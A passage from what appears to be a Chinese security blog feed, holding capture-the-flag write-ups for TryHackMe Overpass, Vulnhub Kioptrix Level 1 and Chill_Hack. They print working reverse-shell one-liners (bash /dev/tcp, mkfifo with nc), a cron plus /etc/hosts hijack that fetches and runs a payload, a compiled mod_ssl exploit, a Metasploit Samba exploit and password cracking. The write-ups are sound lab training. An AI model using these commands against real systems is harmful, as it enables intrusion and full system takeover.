7387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b</span></code></pre><p>然后使用 john 进行爆破</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                            1 ⨯</span>Using default input encoding: UTF-8Loaded 1 password <span class="token function">hash</span> <span class="token punctuation">(</span>SSH, SSH private key <span class="token punctuation">[</span>RSA/DSA/EC/OPENSSH 32/64<span class="token punctuation">]</span><span class="token punctuation">)</span>Cost 1 <span class="token punctuation">(</span>KDF/cipher <span class="token punctuation">[</span>0<span class="token operator">=</span>MD5/AES 1<span class="token operator">=</span>MD5/3DES 2<span class="token operator">=</span>Bcrypt/AES<span class="token punctuation">]</span><span class="token punctuation">)</span> is 0 <span class="token keyword">for</span> all loaded hashesCost 2 <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is 1 <span class="token keyword">for</span> all loaded hashesWill run 2 OpenMP threadsPress <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> statusjames13          <span class="token punctuation">(</span>id_rsa<span class="token punctuation">)</span>1g 0:00:00:00 DONE <span class="token punctuation">(</span>2022-05-05 20:27<span class="token punctuation">)</span> 12.50g/s 167200p/s 167200c/s 167200C/s lisa<span class="token punctuation">..</span>honoluluUse the <span class="token string">"--show"</span> option to display all of the cracked passwords reliablySession completed.</code></pre><p>这里爆破出来了密码为 james13 去就进行连接</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># ssh james@10.10.84.23 -i id_rsa</span>Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_rsa'</span><span class="token keyword">:</span>Welcome to Ubuntu 18.04.4 LTS <span class="token punctuation">(</span>GNU/Linux 4.15.0-108-generic x86_64<span class="token punctuation">)</span> * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Thu May  5 12:32:51 UTC 2022  System load:  0.09               Processes:           92  Usage of /:   22.3% of 18.57GB   Users logged in:     0  Memory usage: 12%                IP address <span class="token keyword">for</span> eth0: 10.10.84.23  Swap usage:   0%47 packages can be updated.0 updates are security updates.Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1james@overpass-prod:~$ <span class="token function">whoami</span><span class="token operator">&amp;&amp;</span><span class="token function">id</span>jamesuid<span class="token operator">=</span>1001<span class="token punctuation">(</span>james<span class="token punctuation">)</span> gid<span class="token operator">=</span>1001<span class="token punctuation">(</span>james<span class="token punctuation">)</span> groups<span class="token operator">=</span>1001<span class="token punctuation">(</span>james<span class="token punctuation">)</span></code></pre><p>成功拿到 user 权限</p><pre class=" language-bash"><code class="language-bash">james@overpass-prod:~$ <span class="token function">ls</span>todo.txt  user.txtjames@overpass-prod:~$ <span class="token function">cat</span> user.txtthm<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;65c1aaf000506e56996822c6281e6bf7&amp;#125;</span></code></pre><p>成功拿到 user 权限的 flag 文件</p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><pre class=" language-bash"><code class="language-bash">james@overpass-prod:~$ <span class="token function">cat</span> todo.txtTo Do:<span class="token operator">></span> Update Overpass<span class="token string">' Encryption, Muirland has been complaining that it'</span>s not strong enough<span class="token operator">></span> Write down my password somewhere on a sticky note so that I don<span class="token string">'t forget it.  Wait, we make a password manager. Why don'</span>t I just use that?<span class="token operator">></span> Test Overpass <span class="token keyword">for</span> macOS, it builds fine but I<span class="token string">'m not sure it actually works> Ask Paradox how he got the automated build script working and where the builds go.  They'</span>re not updating on the website</code></pre><p>这有个 todo.txt 文件作为提示，不过我英语不好，也不确定说的啥，还是先跑个 LinPeas 看看吧</p><pre class=" language-bash"><code class="language-bash">SHELL<span class="token operator">=</span>/bin/shPATH<span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin17 *    * * *   root    <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.hourly25 6    * * *   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.daily <span class="token punctuation">)</span>47 6    * * 7   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class="token punctuation">)</span>52 6    1 * *   root    <span class="token function">test</span> -x /usr/sbin/anacron <span class="token operator">||</span> <span class="token punctuation">(</span> <span class="token function">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class="token punctuation">)</span>* * * * * root curl overpass.thm/downloads/src/buildscript.sh <span class="token operator">|</span> <span class="token function">bash</span></code></pre><p>这里看到一个，root 会使用 curl 向 overpass.htm&#x2F;downloads&#x2F;src&#x2F;buildscrit.sh 请求内容，然后使用 bash 执行</p><pre class=" language-bash"><code class="language-bash">╔══════════╣ Hostname, hosts and DNSoverpass-prod127.0.0.1 localhost127.0.1.1 overpass-prod127.0.0.1 overpass.thm::1     ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allroutersnameserver 127.0.0.53options edns0search eu-west-1.compute.internal</code></pre><p>然后在这里可以看到 overpass.htm 是指向的 127.0.0.1</p><pre class=" language-bash"><code class="language-bash">james@overpass-prod:~$ <span class="token function">ls</span> -la /etc/hosts-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts</code></pre><p>这里可以看到，我们是有权限修改 &#x2F;etc&#x2F;hosts 的内容的</p><p>那提权思路就有了</p><p>首先创建指定的目录和脚本</p><pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p downloads/src <span class="token operator">&amp;&amp;</span> vim downloads/src/buildscript.sh</code></pre><p>然后写入我们的 payload</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">'exec bash -i &amp;>/dev/tcp/10.18.112.117/4444 &lt;&amp;1'</span></code></pre><p>接着需要两个窗口</p><p>第一个窗口 使用 nc 监听一个端口</p><pre class=" language-bash"><code class="language-bash">nc -nvlp 4444</code></pre><p>第二个窗口 使用 python3 开启一个 http 服务</p><pre class=" language-bash"><code class="language-bash">python3 -m http.server 80</code></pre><p>然后去 shell 里修改 &#x2F;etc&#x2F;hosts 的内容</p><pre class=" language-bash"><code class="language-bash">10.18.112.117 overpass.thm</code></pre><p>把第三行改成这样，然后等着就行了</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># python3 -m http.server 80  </span>Serving HTTP on 0.0.0.0 port 80 <span class="token punctuation">(</span>http://0.0.0.0:80/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.10.10.84.23 - - <span class="token punctuation">[</span>05/May/2022 09:17:01<span class="token punctuation">]</span> <span class="token string">"GET /downloads/src/buildscript.sh HTTP/1.1"</span> 200 -</code></pre><p>成功下载了我们的 payload</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># nc -nvlp 4444</span>listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 4444 <span class="token punctuation">..</span>.connect to <span class="token punctuation">[</span>10.18.112.117<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>10.10.84.23<span class="token punctuation">]</span> 43604bash: cannot <span class="token keyword">set</span> terminal process group <span class="token punctuation">(</span>16146<span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> devicebash: no job control <span class="token keyword">in</span> this shellroot@overpass-prod:~<span class="token comment" spellcheck="true"># whoami&amp;&amp;id</span><span class="token function">whoami</span><span class="token operator">&amp;&amp;</span><span class="token function">id</span>                                                                                                                                    root                                                                                                                                          uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> groups<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre><p>成功拿到了 root 权限</p><pre class=" language-bash"><code class="language-bash">root@overpass-prod:~<span class="token comment" spellcheck="true"># ls                                                                                                                      </span><span class="token function">ls</span>                                                                                                                                            buildStatus                                                                                                                                   builds                                                                                                                                        downloads                                                                                                                                     go                                                                                                                                            root.txt                                                                                                                                      src                                                                                                                                           root@overpass-prod:~<span class="token comment" spellcheck="true"># cat root.txt                                                                                                            </span><span class="token function">cat</span> root.txt                                                                                                                                  thm<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;7f336f8c359dbac18d54fdd64ea753bb&amp;#125;</span></code></pre><p>成功拿到了 root 权限的 flag 文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Kioptrix Level 1 靶场实战</title>
      <link href="/2021/11/13/Kioptrix/"/>
      <url>/2021/11/13/Kioptrix/</url>
      
        <content type="html"><![CDATA[<h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><pre><code>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.这个Kioptrix VM Image是很容易的挑战。游戏的目的是通过任何可能的手段获得root权限（除了实际入侵VM服务器或玩家）。这些游戏的目的是学习漏洞评估和利用方面的基本工具和技术。成功完成这些挑战的方法有很多。</code></pre><pre><code>下载地址https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</code></pre><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先使用arp获取靶机的IP地址</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.1.102   00:0c:29:55:cb:15       VMware, Inc.9 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded</code></pre><p>确定靶机IP地址为192.168.1.102，使用nmap进行端口扫描</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 ESTNmap scan report for 192.168.1.102Host is up (0.00042s latency).Not shown: 65529 closed portsPORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)| ssh-hostkey:|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)|_sshv1: Server supports SSHv180/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)| http-methods:|_  Potentially risky methods: TRACE|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-title: Test Page for the Apache Web Server on Red Hat Linux111/tcp  open  rpcbind     2 (RPC #100000)| rpcinfo:|   program version    port/proto  service|   100000  2            111/tcp   rpcbind|   100000  2            111/udp   rpcbind|   100024  1           1024/tcp   status|_  100024  1           1024/udp   status139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-title: 400 Bad Request| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--| Not valid before: 2009-09-26T09:32:06|_Not valid after:  2010-09-26T09:32:06|_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time.| sslv2:|   SSLv2 supported|   ciphers:|     SSL2_RC2_128_CBC_WITH_MD5|     SSL2_RC4_128_WITH_MD5|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5|     SSL2_RC4_64_WITH_MD5|     SSL2_RC4_128_EXPORT40_WITH_MD5|     SSL2_DES_192_EDE3_CBC_WITH_MD5|_    SSL2_DES_64_CBC_WITH_MD51024/tcp open  status      1 (RPC #100024)MAC Address: 00:0C:29:55:CB:15 (VMware)Device type: general purposeRunning: Linux 2.4.XOS CPE: cpe:/o:linux:linux_kernel:2.4OS details: Linux 2.4.9 - 2.4.18 (likely embedded)Network Distance: 1 hopHost script results:|_clock-skew: 1h01m54s|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)|_smb2-time: Protocol negotiation failed (SMB2)TRACEROUTEHOP RTT     ADDRESS1   0.42 ms 192.168.1.102OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 69.83 seconds</code></pre><p>这东西稍微的有点多，一个个看</p><img src="/2021/11/13/Kioptrix/image1.png" class=""><p>80端口好像也没啥可看的？扫个目录看看吧</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://192.168.1.102/[+] Method:                  GET[+] Threads:                 200[+] Wordlist:                /usr/share/dirb/wordlists/common.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Extensions:              php[+] Expanded:                true[+] Timeout:                 10s===============================================================2021/11/12 07:52:42 Starting gobuster in directory enumeration mode===============================================================http://192.168.1.102/.htaccess            (Status: 403) [Size: 273]http://192.168.1.102/.htpasswd            (Status: 403) [Size: 273]http://192.168.1.102/.hta                 (Status: 403) [Size: 268]http://192.168.1.102/.htaccess.php        (Status: 403) [Size: 277]http://192.168.1.102/.htpasswd.php        (Status: 403) [Size: 277]http://192.168.1.102/.hta.php             (Status: 403) [Size: 272]http://192.168.1.102/~root                (Status: 403) [Size: 269]http://192.168.1.102/~operator            (Status: 403) [Size: 273]http://192.168.1.102/cgi-bin/             (Status: 403) [Size: 272]http://192.168.1.102/index.html           (Status: 200) [Size: 2890]http://192.168.1.102/manual               (Status: 301) [Size: 294] [--&gt; http://127.0.0.1/manual/]http://192.168.1.102/mrtg                 (Status: 301) [Size: 292] [--&gt; http://127.0.0.1/mrtg/]http://192.168.1.102/usage                (Status: 301) [Size: 293] [--&gt; http://127.0.0.1/usage/]http://192.168.1.102/test.php             (Status: 200) [Size: 27]</code></pre><p>挨个去看看</p><img src="/2021/11/13/Kioptrix/image2.png" class=""><p>几个页面都会跳转到127.0.0.1，只有test.php可以访问，而且还没什么东西</p><p>继续回到端口看看吧</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# smbclient -L 192.168.1.102                                                                                                            1 ⨯protocol negotiation failed: NT_STATUS_IO_TIMEOUT</code></pre><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>看到80端口后面的mod_ssl&#x2F;2.8.4，去搜一下有没有Exploit</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# searchsploit mod_ssl------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title                                                                                              |  Path------------------------------------------------------------------------------------------------------------ ---------------------------------Apache mod_ssl 2.0.x - Remote Denial of Service                                                             | linux/dos/24590.txtApache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                  | multiple/dos/21575.txtApache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck.c&#39; Remote Buffer Overflow                                        | unix/remote/21671.cApache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (1)                                  | unix/remote/764.cApache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (2)                                  | unix/remote/47080.cApache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &#39;openssl-too-open.c&#39; SSL2 KEY_ARG Overflow                | unix/remote/40347.txt------------------------------------------------------------------------------------------------------------ ---------------------------------Shellcodes: No Results</code></pre><p>对比mod_ssl&#x2F;2.8.4版本，有三个版本合适，挨个进行测试</p><p>经过测试发现unix&#x2F;remote&#x2F;47080.c是可以使用的，咱们给他复制出来</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# locate unix/remote/47080.c/usr/share/exploitdb/exploits/unix/remote/47080.c┌──(root💀kali)-[~/Desktop]└─# cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./</code></pre><p>然后使用gcc进行编译</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# gcc -o exploit 47080.c -lcrypto47080.c:21:10: fatal error: openssl/ssl.h: 没有那个文件或目录   21 | #include &lt;openssl/ssl.h&gt;      |          ^~~~~~~~~~~~~~~compilation terminated.</code></pre><p>提示报错了，经过百度搜索，发现是缺少了组件</p><p>咱们使用apt进行安装</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# apt-get install libssl1.0-dev</code></pre><p>然后再进行编译</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# gcc -o exploit 47080.c -lcrypto┌──(root💀kali)-[~/Desktop]└─# ls47080.c  exploit</code></pre><p>去运行一下</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# ./exploit******************************************************************** OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open ********************************************************************* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE ** #hackarena  irc.brasnet.org                                     ** TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname ** #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam ** #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ ********************************************************************: Usage: ./exploit target box [port] [-c N]  target - supported box eg: 0x00  box - hostname or IP address  port - port for ssl connection  -c open N connections. (use range 40-50 if u dont know)</code></pre><p>运行后得到了运行参数，咱们还得先找到对应的版本</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# ./exploit | grep apache-1.3.20                                                                                                        1 ⨯        0x02 - Cobalt Sun 6.0 (apache-1.3.20)        0x27 - FreeBSD (apache-1.3.20)        0x28 - FreeBSD (apache-1.3.20)        0x29 - FreeBSD (apache-1.3.20+2.8.4)        0x2a - FreeBSD (apache-1.3.20_1)        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2        0x7e - Slackware Linux 8.0 (apache-1.3.20)        0x86 - SuSE Linux 7.3 (apache-1.3.20)</code></pre><p>符合条件的有两个，分别是0x6a和0x6b，分别去测试一下</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# ./exploit 0x6a 192.168.1.102 -c 40******************************************************************** OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open ********************************************************************* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE ** #hackarena  irc.brasnet.org                                     ** TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname ** #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam ** #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ ********************************************************************Connection... 40 of 40Establishing SSL connectioncipher: 0x4043808c   ciphers: 0x80f8070Ready to send shellcodeSpawning shell...Good Bye!</code></pre><p>0x6a测试失败，现在去测试一下0x6b</p><pre><code>┌──(root💀kali)-[~/Desktop]└─# ./exploit 0x6b 192.168.1.102 -c 40******************************************************************** OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open ********************************************************************* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE ** #hackarena  irc.brasnet.org                                     ** TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname ** #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam ** #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ ********************************************************************Connection... 40 of 40Establishing SSL connectioncipher: 0x4043808c   ciphers: 0x80f81e8Ready to send shellcodeSpawning shell...bash: no job control in this shellbash-2.05$d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo--09:32:52--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c           =&gt; `ptrace-kmod.c&#39;Connecting to dl.packetstormsecurity.net:443... connected!Unable to establish SSL connection.Unable to establish SSL connection.gcc: ptrace-kmod.c: No such file or directorygcc: No input filesrm: cannot remove `ptrace-kmod.c&#39;: No such file or directorybash: ./exploit: No such file or directorybash-2.05$bash-2.05$ whoami&amp;&amp;idwhoami&amp;&amp;idapacheuid=48(apache) gid=48(apache) groups=48(apache)</code></pre><p>0x6b成功getshell，现在去提权</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>经过测试后没有发现提权的点，但是发现了另一种root权限的方法，那就是用msf的模块</p><pre><code>use exploit/linux/samba/trans2openset payload linux/x86/shell_reverse_tcpshow optionsset rhosts 192.168.1.102exploitmsf6 exploit(linux/samba/trans2open) &gt; exploit[*] Started reverse TCP handler on 192.168.1.106:4444[*] 192.168.1.102:139 - Trying return address 0xbffffdfc...[*] 192.168.1.102:139 - Trying return address 0xbffffcfc...[*] 192.168.1.102:139 - Trying return address 0xbffffbfc...[*] 192.168.1.102:139 - Trying return address 0xbffffafc...[*] 192.168.1.102:139 - Trying return address 0xbffff9fc...[*] 192.168.1.102:139 - Trying return address 0xbffff8fc...[*] Command shell session 1 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500[*] Command shell session 2 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500[*] Command shell session 3 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500whoami&amp;&amp;idrootuid=0(root) gid=0(root) groups=99(nobody)</code></pre><p>用msf的模块打就是root，至于为啥我也没研究出个所以然来（主要因为菜）</p><p>知道原因的小伙伴可以告诉我一下</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Chill_Hack 靶场实战</title>
      <link href="/2021/10/17/Chill_Hack/"/>
      <url>/2021/10/17/Chill_Hack/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub-Chill-Hack"><a href="#Vulnhub-Chill-Hack" class="headerlink" title="Vulnhub-Chill_Hack"></a>Vulnhub-Chill_Hack</h1><p>靶场实战 Vulnhub-Chill_Hack</p><p>靶场下载地址<a href="https://www.vulnhub.com/entry/chill-hack-1,622/">https://www.vulnhub.com/entry/chill-hack-1,622/</a></p><p>废话不多说 直接开始</p><p>第一步使用kali扫描内网IP</p><p>Arp-scan –l</p><img src="/2021/10/17/Chill_Hack/image1.png" class=""><p>获得靶场IP为192.168.72.132</p><p>对靶场进行端口扫描</p><p>Nmap –A –v 192.168.72.132</p><img src="/2021/10/17/Chill_Hack/image2.png" class=""><p>发现存在21 22 80三个端口</p><p>21端口存在匿名访问 咱们先访问看看</p><p>用户名使用anonymous 密码为空</p><img src="/2021/10/17/Chill_Hack/image3.png" class=""><p>成功登陆</p><p>查看有什么文件</p><img src="/2021/10/17/Chill_Hack/image4.png" class=""><p>发现存在一个txt文件 我们查看一下</p><p>使用get下载到本地然后打开查看</p><img src="/2021/10/17/Chill_Hack/image5.png" class=""><img src="/2021/10/17/Chill_Hack/image6.png" class=""><p>嗯…好像也没什么用</p><p>我们还是先看看80端口的Web服务吧</p><img src="/2021/10/17/Chill_Hack/image7.png" class=""><p>看上去像是一个体育比赛的官网？</p><p>扫描一下目录</p><img src="/2021/10/17/Chill_Hack/image8.png" class=""><p>发现了一个有趣的URL <a href="http://192.168.72.132/secret/index.php">http://192.168.72.132/secret/index.php</a></p><p>可以执行命令</p><img src="/2021/10/17/Chill_Hack/image9.png" class=""><p>OK 突破口应该就在这里了</p><p>当我输入ls想查看一下当前目录文件的时候</p><img src="/2021/10/17/Chill_Hack/image10.png" class=""><p>这时我想起来我们那个note.txt文件里的话是什么意思</p><p>证明这里有过滤 就是不知道是白名单还是黑名单了</p><p>经过我大量测试 该靶场为黑名单验证</p><p>那就好办了 绕过吧</p><p>出去吃了个饭 回来突然来了思路</p><p>将两个指令结合起来 不就成了吗</p><p>例如 ls会被拦截</p><p>那就 whoami;ls</p><img src="/2021/10/17/Chill_Hack/image11.png" class=""><p>成功执行 我可真是个小机灵</p><p>将该方法和NC反弹一结合 不就拿到shell了？</p><p>经过大量测试 发现可用的反弹语句为</p><p>dir;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.72.130 7777 &gt; &#x2F;tmp&#x2F;f</p><p>本机监听 nc –lvp 7777</p><p>执行 成功拿到一个shell</p><img src="/2021/10/17/Chill_Hack/image12.png" class=""><img src="/2021/10/17/Chill_Hack/image13.png" class=""><p>该shell权限还是较低 并且操作非常不便利 咱们要想办法提权</p><p>查找python版本</p><p>Which python</p><img src="/2021/10/17/Chill_Hack/image14.png" class=""><p>成功确认python版本为python3</p><p>使用python3将shell进行提升</p><p>python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><img src="/2021/10/17/Chill_Hack/image15.png" class=""><p>成功</p><p>该命令不会对电脑有什么危害 但偶尔会有奇效</p><img src="/2021/10/17/Chill_Hack/image16.png" class=""><p>在这个文件夹下 这个hacker.php引起了我的注意 查看一下吧</p><img src="/2021/10/17/Chill_Hack/image17.png" class=""><p>在黑暗中我会看到答案？真就人均谜语人呗</p><p>在hacker.php中 我们看到images文件夹中有一张图片 应该就是线索所在</p><p>咱们进入images文件夹</p><img src="/2021/10/17/Chill_Hack/image18.png" class=""><p>OK 咱们把这张图片用nc下载下来 也可以用python3开启http服务进行下载 不过我图省事儿 就nc了吧</p><p>本地电脑运行 nc –nvlp 4444 &gt; hacker-with-laptop_23-2147985341.jpg</p><p>咱们保持原名不动</p><p>Shell里运行 nc 192.168.72.130 4444 -w 4 &lt; hacker-with-laptop_23-2147985341.jpg</p><img src="/2021/10/17/Chill_Hack/image19.png" class=""><p>OK 稍等一会儿 成功下载下来</p><p>根据hacker.php中的提示 在黑暗中我们会看到答案 这不就是妥妥的图片隐写吗 不愧是我 最近的柯南没白看</p><p>使用steghide查看</p><img src="/2021/10/17/Chill_Hack/image20.png" class=""><p>果然存在一个名为backup.zip的压缩包 不愧是我</p><p>依然使用steghide进行解压</p><img src="/2021/10/17/Chill_Hack/image21.png" class=""><p>OK 得到了这个名为backup.zip的压缩包文件</p><p>我们现在将他解压缩</p><img src="/2021/10/17/Chill_Hack/image22.png" class=""><p>我丢啊 这里来个密码 成吧 再找</p><p>找？找是不可能找的 就咱这暴脾气 爆他！</p><img src="/2021/10/17/Chill_Hack/image23.png" class=""><p>使用zip2johb生成了一个backup.john文件</p><p>咱们使用john爆他</p><img src="/2021/10/17/Chill_Hack/image24.png" class=""><p>OK 完成</p><p>咱们使用john查看密码</p><img src="/2021/10/17/Chill_Hack/image25.png" class=""><p>密码为pass1word 行吧 经典弱口令</p><p>接下来咱们解压文件</p><img src="/2021/10/17/Chill_Hack/image26.png" class=""><p>成功解压出来</p><p>查看解压出来的文件</p><img src="/2021/10/17/Chill_Hack/image27.png" 